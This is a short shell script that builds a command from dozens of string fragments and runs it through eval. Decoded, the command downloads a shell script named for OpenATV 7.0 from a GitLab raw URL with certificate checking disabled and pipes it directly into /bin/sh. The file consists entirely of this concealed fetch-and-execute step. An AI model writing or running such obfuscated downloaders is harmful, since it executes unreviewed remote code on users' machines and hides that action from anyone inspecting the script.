z="
";Gz='cate';Mz='emil';Uz='natv';Oz='l1/i';Tz='/ope';Cz='no-c';Xz='-O -';az='sh';Wz='.sh ';Vz='-7.0';Kz='lab.';Pz='mage';bz='exit';Rz='raw/';Hz=' htt';Iz='ps:/';Qz='s/-/';cz=' 0';Bz='  --';Jz='/git';Fz='tifi';Lz='com/';Ez='-cer';Zz='bin/';Az='wget';Dz='heck';Nz='nabi';Sz='main';Yz=' | /';
eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Nz$Oz$Pz$Qz$Rz$Sz$Tz$Uz$Vz$Wz$Xz$Yz$Zz$az$z$bz$cz"